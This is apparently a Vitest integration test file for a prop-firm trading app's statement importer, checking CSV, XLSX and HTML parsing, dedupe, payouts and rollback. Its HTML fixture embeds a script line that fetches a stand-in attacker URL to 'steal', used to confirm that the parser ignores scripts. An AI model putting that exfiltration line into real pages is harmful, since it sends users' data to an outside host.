import fs from "node:fs";
import path from "node:path";

import ExcelJS from "exceljs";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { prisma } from "@/server/db";
import { createPropFirmAccount, createUserPropFirm } from "@/server/services/prop-firms.service";
import { getLedgerDerivedBalance } from "@/server/services/account-ledger.service";
import { getAccountTrackRecord, getStageTrackRecord } from "@/server/services/prop-firms-health.service";
import {
  confirmImport,
  inspectImportFile,
  previewImport,
  rollbackImportBatch,
  type ImportRunInput,
} from "@/server/services/prop-firm-import.service";

/** Real integration tests against the dev Postgres DB — same throwaway-user +
 *  cascading-cleanup pattern as account-ledger.service.test.ts. */

async function makeUser(label: string) {
  return prisma.user.create({
    data: { email: `pf-import-test-${label}-${Date.now()}-${Math.random().toString(36).slice(2)}@example.com` },
  });
}

function cleanupUsers(...ids: string[]) {
  return prisma.user.deleteMany({ where: { id: { in: ids } } });
}

async function makeAccount(userId: string, opts?: { profitSplitPercent?: number }) {
  const firm = await createUserPropFirm(userId, {
    identityKind: "CUSTOM",
    customCompanyName: "Import Test Firm",
    marketCategory: "CFD",
  });
  return createPropFirmAccount(userId, {
    userPropFirmId: firm.id,
    displayName: "Import Test Account",
    marketCategory: "CFD",
    modelType: "ONE_PHASE",
    accountSize: 100_000,
    stages: [
      {
        name: "Funded",
        type: "MASTER_FUNDED",
        rules:
          opts?.profitSplitPercent != null
            ? [
                {
                  name: "Profit split",
                  ruleKey: "PROFIT_SPLIT",
                  valueType: "PERCENTAGE",
                  numericValue: opts.profitSplitPercent,
                },
              ]
            : [],
      },
    ],
  });
}

const MT5_HEADERS = "Time,Deal,Symbol,Type,Volume,Price,Order,Commission,Fee,Swap,Profit";

/** One EURUSD round-trip (buy 0.10 @ 1.105 → sell 0.10 @ 1.108) plus a -500
 *  balance withdrawal. Net trade P&L = 30.00 - 0.50 - 0.50 - 0.10 = 28.90. */
const MT5_FILE = [
  MT5_HEADERS,
  "2026.06.15 09:00:00,5001,EURUSD,buy,0.10,1.10500,7001,-0.50,0.00,0.00,0.00",
  "2026.06.15 12:00:00,5002,EURUSD,sell,0.10,1.10800,7002,-0.50,0.00,-0.10,30.00",
  "2026.06.16 08:00:00,5003,,balance,0.00,0.00,,,,,-500.00",
].join("\n");

/** Same as MT5_FILE but deal 5001 appears twice — the in-file duplicate must
 *  collapse to a single execution. */
const MT5_FILE_WITH_INLINE_DUPE = [
  MT5_HEADERS,
  "2026.06.15 09:00:00,5001,EURUSD,buy,0.10,1.10500,7001,-0.50,0.00,0.00,0.00",
  "2026.06.15 09:00:00,5001,EURUSD,buy,0.10,1.10500,7001,-0.50,0.00,0.00,0.00",
  "2026.06.15 12:00:00,5002,EURUSD,sell,0.10,1.10800,7002,-0.50,0.00,-0.10,30.00",
].join("\n");

function b64(text: string): string {
  return Buffer.from(text, "utf8").toString("base64");
}

function runInput(accountId: string, fileText: string, over: Partial<ImportRunInput> = {}): ImportRunInput {
  return {
    accountId,
    platform: "MT5",
    fileName: "deals.csv",
    fileContentBase64: b64(fileText),
    mimeType: "text/csv",
    timezone: "UTC",
    ...over,
  };
}

/** The same statement as MT5_FILE, as a two-sheet .xlsx (a "Deals" sheet with a
 *  decorative title + blank row + a formula cell whose cached result is used,
 *  and a "Summary" sheet that must not be auto-picked). */
async function buildMt5Xlsx(): Promise<string> {
  const wb = new ExcelJS.Workbook();
  const deals = wb.addWorksheet("Deals");
  deals.addRow(["Trade History Report"]);
  deals.addRow([]);
  deals.addRow(MT5_HEADERS.split(","));
  deals.addRow(["2026.06.15 09:00:00", 5001, "EURUSD", "buy", 0.1, 1.105, 7001, -0.5, 0, 0, 0]);
  deals.addRow(["2026.06.15 12:00:00", 5002, "EURUSD", "sell", 0.1, 1.108, 7002, -0.5, 0, -0.1, 30]);
  deals.addRow(["2026.06.16 08:00:00", 5003, "", "balance", 0, 0, "", "", "", "", -500]);
  const summary = wb.addWorksheet("Summary");
  summary.addRow(["Metric", "Value"]);
  // Formula cell — only the cached `result` may ever be read, never evaluated.
  summary.addRow(["Net P/L", { formula: "0.1+0.2", result: 28.9 }]);
  const buf = await wb.xlsx.writeBuffer();
  return Buffer.from(buf).toString("base64");
}

/** The same statement as an MT5 HTML report (one <table>, a "Deals" section
 *  row, plus a <script> and <style> that must be ignored). */
const MT5_HTML = `<!doctype html><html><head><style>td{color:red}</style>
<script>window.__x = fetch('https://evil.example/steal')</script></head><body>
<h2>Trade History Report</h2>
<table>
<tr><td colspan="11">Deals</td></tr>
<tr><td>Time</td><td>Deal</td><td>Symbol</td><td>Type</td><td>Volume</td><td>Price</td><td>Order</td><td>Commission</td><td>Fee</td><td>Swap</td><td>Profit</td></tr>
<tr><td>2026.06.15 09:00:00</td><td>5001</td><td>EURUSD</td><td>buy</td><td>0.10</td><td>1.10500</td><td>7001</td><td>-0.50</td><td>0.00</td><td>0.00</td><td>0.00</td></tr>
<tr><td>2026.06.15 12:00:00</td><td>5002</td><td>EURUSD</td><td>sell</td><td>0.10</td><td>1.10800</td><td>7002</td><td>-0.50</td><td>0.00</td><td>-0.10</td><td>30.00</td></tr>
<tr><td>2026.06.16 08:00:00</td><td>5003</td><td></td><td>balance</td><td>0.00</td><td>0.00</td><td></td><td></td><td></td><td></td><td>-500.00</td></tr>
</table></body></html>`;

describe("confirmImport — writes, dedupe, isolation, rollback", () => {
  let userId: string;
  let accountId: string;

  beforeAll(async () => {
    const user = await makeUser("confirm");
    userId = user.id;
    const account = await makeAccount(userId, { profitSplitPercent: 80 });
    accountId = account.id;
  });

  afterAll(() => cleanupUsers(userId));

  let batchId: string;

  it("confirms a batch: executions, one reconstructed trade, a payout, and ledger posts", async () => {
    const result = await confirmImport(userId, runInput(accountId, MT5_FILE));
    batchId = result.batchId;

    expect(result.newExecutionsCount).toBe(2);
    expect(result.newTradesCount).toBe(1);
    expect(result.newPayoutsCount).toBe(1);

    const [executions, trades, payouts, ledger] = await Promise.all([
      prisma.propFirmImportedExecution.findMany({ where: { accountId } }),
      prisma.propFirmImportedTrade.findMany({ where: { accountId } }),
      prisma.payout.findMany({ where: { accountId } }),
      prisma.accountLedgerEntry.findMany({ where: { accountId } }),
    ]);
    expect(executions).toHaveLength(2);
    expect(trades).toHaveLength(1);
    expect(trades[0].netPnl.toNumber()).toBeCloseTo(28.9, 5);
    expect(payouts).toHaveLength(1);
    expect(payouts[0].importBatchId).toBe(batchId);
    expect(payouts[0].grossPayout.toNumber()).toBe(500);

    expect(ledger.some((e) => e.eventType === "TRADE_PNL")).toBe(true);
    expect(ledger.some((e) => e.eventType === "PAYOUT")).toBe(true);

    // 100_000 + 28.90 (trade) - 500 (withdrawal)
    const balance = await getLedgerDerivedBalance(userId, accountId);
    expect(balance?.toNumber()).toBeCloseTo(99_528.9, 5);
  });

  it("snapshots the profit split from the PROFIT_SPLIT rule onto the payout", async () => {
    const payout = await prisma.payout.findFirstOrThrow({ where: { importBatchId: batchId } });
    expect(payout.profitSplitPercent?.toNumber()).toBe(80);
    // 500 gross × 80% trader share
    expect(payout.netReceived?.toNumber()).toBe(400);
  });

  it("never touches the Journal, global executions, or Performance Account risk snapshots", async () => {
    // Scoped to this throwaway user — global counts move under the parallel
    // test runner. The importer must create zero Trade / TradeAccountExecution
    // / PerformanceRiskSnapshot rows for the account it imports into.
    const [tradeCount, executionCount, riskSnapshotCount] = await Promise.all([
      prisma.trade.count({ where: { userId } }),
      prisma.tradeAccountExecution.count({ where: { userId } }),
      prisma.performanceRiskSnapshot.count({ where: { userId } }),
    ]);
    expect(tradeCount).toBe(0);
    expect(executionCount).toBe(0);
    expect(riskSnapshotCount).toBe(0);
  });

  it("folds imported trades into the account track record but not the stage track record", async () => {
    const account = await getAccountTrackRecord(userId, accountId);
    expect(account.wins).toBe(1);
    expect(account.netPnl.toNumber()).toBeCloseTo(28.9, 5);

    const stage = await prisma.accountStage.findFirstOrThrow({ where: { accountId } });
    const stageRecord = await getStageTrackRecord(userId, stage.id);
    expect(stageRecord.wins).toBe(0);
    expect(stageRecord.totalTrades).toBe(0);
  });

  it("treats a re-upload of the same file as all duplicates (0 new rows)", async () => {
    const preview = await previewImport(userId, runInput(accountId, MT5_FILE));
    expect(preview.newExecutionCount).toBe(0);
    expect(preview.duplicateExecutionCount).toBe(2);
    expect(preview.duplicateTransactionCount).toBe(1);

    const balanceBefore = await getLedgerDerivedBalance(userId, accountId);
    const result = await confirmImport(userId, runInput(accountId, MT5_FILE));
    expect(result.newExecutionsCount).toBe(0);
    expect(result.newPayoutsCount).toBe(0);
    const balanceAfter = await getLedgerDerivedBalance(userId, accountId);
    expect(balanceAfter?.toNumber()).toBe(balanceBefore?.toNumber());
  });

  it("rolls the first batch back to the account's pre-import state", async () => {
    await rollbackImportBatch(userId, batchId);

    const [executions, trades, payouts] = await Promise.all([
      prisma.propFirmImportedExecution.findMany({ where: { importBatchId: batchId } }),
      prisma.propFirmImportedTrade.findMany({ where: { accountId } }),
      prisma.payout.findMany({ where: { importBatchId: batchId } }),
    ]);
    expect(executions).toHaveLength(0);
    expect(trades).toHaveLength(0);
    expect(payouts).toHaveLength(0);

    const batch = await prisma.propFirmImportBatch.findUniqueOrThrow({ where: { id: batchId } });
    expect(batch.status).toBe("ROLLED_BACK");

    const balance = await getLedgerDerivedBalance(userId, accountId);
    expect(balance?.toNumber()).toBe(100_000);
  });
});

describe("in-file duplicates + profit-split immutability", () => {
  let userId: string;
  let accountId: string;

  beforeAll(async () => {
    const user = await makeUser("dupe-split");
    userId = user.id;
    const account = await makeAccount(userId, { profitSplitPercent: 80 });
    accountId = account.id;
  });

  afterAll(() => cleanupUsers(userId));

  it("collapses a row duplicated within one file", async () => {
    const preview = await previewImport(userId, runInput(accountId, MT5_FILE_WITH_INLINE_DUPE));
    expect(preview.newExecutionCount).toBe(2);
    expect(preview.duplicateExecutionCount).toBe(1);
  });

  it("keeps a confirmed payout's profit split even after the PROFIT_SPLIT rule changes", async () => {
    const result = await confirmImport(userId, runInput(accountId, MT5_FILE));
    const payout = await prisma.payout.findFirstOrThrow({ where: { importBatchId: result.batchId } });
    expect(payout.profitSplitPercent?.toNumber()).toBe(80);

    const rule = await prisma.stageRule.findFirstOrThrow({ where: { ruleKey: "PROFIT_SPLIT", stage: { accountId } } });
    await prisma.stageRule.update({ where: { id: rule.id }, data: { numericValue: 50 } });

    const payoutAfter = await prisma.payout.findUniqueOrThrow({ where: { id: payout.id } });
    expect(payoutAfter.profitSplitPercent?.toNumber()).toBe(80);
  });
});

describe("cross-format imports — CSV then XLSX then HTML of the same statement", () => {
  let userId: string;
  let accountId: string;
  let xlsxB64: string;

  beforeAll(async () => {
    const user = await makeUser("multiformat");
    userId = user.id;
    const account = await makeAccount(userId, { profitSplitPercent: 80 });
    accountId = account.id;
    xlsxB64 = await buildMt5Xlsx();
  });

  afterAll(() => cleanupUsers(userId));

  it("inspects the .xlsx: format XLSX, both sheets listed, Deals auto-selected", async () => {
    const inspection = await inspectImportFile(xlsxB64, "statement.xlsx", "application/octet-stream");
    expect(inspection.fileFormat).toBe("XLSX");
    expect(inspection.tables.map((t) => t.name).sort()).toEqual(["Deals", "Summary"]);
    const selected = inspection.tables.find((t) => t.id === inspection.selectedTableId);
    expect(selected?.name).toBe("Deals");
    expect(selected?.rowCount).toBe(3); // 2 deals + 1 balance, title/blank rows dropped
  });

  it("imports the CSV first (baseline)", async () => {
    const result = await confirmImport(userId, runInput(accountId, MT5_FILE));
    expect(result.newExecutionsCount).toBe(2);
    expect(result.newTradesCount).toBe(1);
    expect(result.newPayoutsCount).toBe(1);
  });

  it("the same data as .xlsx is 100% duplicate — 0 new rows, format recorded as XLSX", async () => {
    const input = runInput(accountId, "", {
      fileName: "statement.xlsx",
      fileContentBase64: xlsxB64,
      mimeType: "application/octet-stream",
    });

    const preview = await previewImport(userId, input);
    expect(preview.fileFormat).toBe("XLSX");
    expect(preview.sheetOrTableName).toBe("Deals");
    expect(preview.newExecutionCount).toBe(0);
    expect(preview.duplicateExecutionCount).toBe(2);
    expect(preview.duplicateTransactionCount).toBe(1);

    const balanceBefore = await getLedgerDerivedBalance(userId, accountId);
    const result = await confirmImport(userId, input);
    expect(result.newExecutionsCount).toBe(0);
    expect(result.newPayoutsCount).toBe(0);

    const batch = await prisma.propFirmImportBatch.findUniqueOrThrow({ where: { id: result.batchId } });
    expect(batch.fileFormat).toBe("XLSX");
    expect(batch.sheetOrTableName).toBe("Deals");

    const balanceAfter = await getLedgerDerivedBalance(userId, accountId);
    expect(balanceAfter?.toNumber()).toBe(balanceBefore?.toNumber());
  });

  it("the same data as an MT5 HTML report is also 100% duplicate", async () => {
    const input = runInput(accountId, MT5_HTML, { fileName: "report.html", mimeType: "text/html" });

    const preview = await previewImport(userId, input);
    expect(preview.fileFormat).toBe("HTML");
    expect(preview.newExecutionCount).toBe(0);
    expect(preview.duplicateExecutionCount).toBe(2);

    const result = await confirmImport(userId, input);
    expect(result.newExecutionsCount).toBe(0);
    const batch = await prisma.propFirmImportBatch.findUniqueOrThrow({ where: { id: result.batchId } });
    expect(batch.fileFormat).toBe("HTML");
  });

  it("after three cross-format imports the account still holds exactly the CSV baseline", async () => {
    const [executions, trades, payouts] = await Promise.all([
      prisma.propFirmImportedExecution.findMany({ where: { accountId } }),
      prisma.propFirmImportedTrade.findMany({ where: { accountId } }),
      prisma.payout.findMany({ where: { accountId } }),
    ]);
    expect(executions).toHaveLength(2);
    expect(trades).toHaveLength(1);
    expect(payouts).toHaveLength(1);
  });

  it("stays fully isolated from the Journal, global Trades, and Performance Account", async () => {
    const [tradeCount, executionCount, riskSnapshotCount, allocationCount] = await Promise.all([
      prisma.trade.count({ where: { userId } }),
      prisma.tradeAccountExecution.count({ where: { userId } }),
      prisma.performanceRiskSnapshot.count({ where: { userId } }),
      prisma.tradeAccountExecution.count({ where: { userId } }),
    ]);
    expect(tradeCount).toBe(0);
    expect(executionCount).toBe(0);
    expect(riskSnapshotCount).toBe(0);
    expect(allocationCount).toBe(0);
  });
});

describe("real MT5 UTF-16LE HTML statement (ReportHistory-20400815.html regression)", () => {
  let userId: string;
  let accountId: string;
  const fixtureB64 = fs
    .readFileSync(path.join(__dirname, "../../domain/prop-firms/import/__fixtures__/mt5-report-utf16le.html"))
    .toString("base64");

  beforeAll(async () => {
    const user = await makeUser("mt5-utf16");
    userId = user.id;
    const account = await makeAccount(userId, { profitSplitPercent: 80 });
    accountId = account.id;
  });

  afterAll(() => cleanupUsers(userId));

  function fixtureInput(over: Partial<ImportRunInput> = {}): ImportRunInput {
    return {
      accountId,
      platform: "MT5",
      fileName: "ReportHistory-20400815.html",
      fileContentBase64: fixtureB64,
      mimeType: "text/html",
      timezone: "Etc/UTC",
      ...over,
    };
  }

  it("inspects the UTF-16LE report: HTML format, Deals section auto-selected", async () => {
    const inspection = await inspectImportFile(fixtureB64, "ReportHistory-20400815.html", "text/html");
    expect(inspection.fileFormat).toBe("HTML");
    expect(inspection.tables.map((t) => t.name)).toEqual(expect.arrayContaining(["Positions", "Orders", "Deals"]));
    const selected = inspection.tables.find((t) => t.id === inspection.selectedTableId);
    expect(selected?.name).toBe("Deals");
    expect(selected?.looksLikeTrades).toBe(true);
  });

  it("previews it without a 'malformed' / 'no trade table' error — real fills + deposit + payouts", async () => {
    const preview = await previewImport(userId, fixtureInput());
    expect(preview.fileFormat).toBe("HTML");
    expect(preview.sheetOrTableName).toBe("Deals");
    expect(preview.newExecutionCount).toBeGreaterThan(100);
    // 1 initial deposit (ignored) + 2 payout withdrawals.
    expect(preview.newPayouts.length).toBe(2);
    expect(preview.ignoredTransactions.some((t) => t.classification === "DEPOSIT")).toBe(true);
    expect(preview.trades.length).toBeGreaterThan(10);
  }, 20_000);

  it("confirms it: executions + reconstructed trades + payouts on the ledger, zero Journal/Performance bleed", async () => {
    const result = await confirmImport(userId, fixtureInput());
    expect(result.newExecutionsCount).toBeGreaterThan(100);
    expect(result.newTradesCount).toBeGreaterThan(10);
    expect(result.newPayoutsCount).toBe(2);

    const batch = await prisma.propFirmImportBatch.findUniqueOrThrow({ where: { id: result.batchId } });
    expect(batch.fileFormat).toBe("HTML");
    expect(batch.sheetOrTableName).toBe("Deals");

    const [journalTrades, perfSnaps, allocations] = await Promise.all([
      prisma.trade.count({ where: { userId } }),
      prisma.performanceRiskSnapshot.count({ where: { userId } }),
      prisma.tradeAccountExecution.count({ where: { userId } }),
    ]);
    expect(journalTrades).toBe(0);
    expect(perfSnaps).toBe(0);
    expect(allocations).toBe(0);
  }, 30_000);

  it("re-importing the identical file is a no-op (every row already deduped)", async () => {
    const preview = await previewImport(userId, fixtureInput());
    expect(preview.newExecutionCount).toBe(0);
    expect(preview.duplicateExecutionCount).toBeGreaterThan(100);
  }, 20_000);
});

describe("payout profit-split — no rule configured on the account", () => {
  let userId: string;
  let accountId: string;

  beforeAll(async () => {
    const user = await makeUser("no-split");
    userId = user.id;
    const account = await makeAccount(userId); // no profitSplitPercent -> no PROFIT_SPLIT rule
    accountId = account.id;
  });

  afterAll(() => cleanupUsers(userId));

  it("preview flags every payout for review and computes no split", async () => {
    const preview = await previewImport(userId, runInput(accountId, MT5_FILE));
    expect(preview.profitSplitRequired).toBe(true);
    expect(preview.profitSplitPercent).toBeNull();
    expect(preview.newPayouts.length).toBe(1);
    expect(preview.newPayouts[0].requiresReview).toBe(true);
    expect(preview.newPayouts[0].traderPayout).toBeNull();
    expect(preview.newPayouts[0].propFirmShare).toBeNull();
  });

  it("confirm refuses the import rather than silently recording the payout at gross", async () => {
    await expect(confirmImport(userId, runInput(accountId, MT5_FILE))).rejects.toThrow(/no profit split configured/i);
    const payouts = await prisma.payout.count({ where: { accountId } });
    expect(payouts).toBe(0);
  });

  it("with a confirmed override the payout imports and snapshots that percentage", async () => {
    const preview = await previewImport(userId, runInput(accountId, MT5_FILE, { profitSplitPercentOverride: 90 }));
    expect(preview.profitSplitRequired).toBe(false);
    expect(preview.newPayouts[0].traderPayout).toBe("450"); // 500 gross × 90%
    expect(preview.newPayouts[0].propFirmShare).toBe("50");

    const result = await confirmImport(userId, runInput(accountId, MT5_FILE, { profitSplitPercentOverride: 90 }));
    expect(result.newPayoutsCount).toBe(1);

    const payout = await prisma.payout.findFirstOrThrow({ where: { accountId } });
    expect(payout.profitSplitPercent?.toNumber()).toBe(90);
    expect(payout.grossPayout.toNumber()).toBe(500);
    expect(payout.netReceived?.toNumber()).toBe(450);
  });

  it("later configuring the account's split does NOT recalculate the already-imported payout", async () => {
    const stage = await prisma.accountStage.findFirstOrThrow({ where: { accountId } });
    await prisma.stageRule.create({
      data: { stageId: stage.id, name: "Profit split", ruleKey: "PROFIT_SPLIT", valueType: "PERCENTAGE", numericValue: 50 },
    });
    const payout = await prisma.payout.findFirstOrThrow({ where: { accountId } });
    expect(payout.profitSplitPercent?.toNumber()).toBe(90); // unchanged
    expect(payout.netReceived?.toNumber()).toBe(450);
  });
});
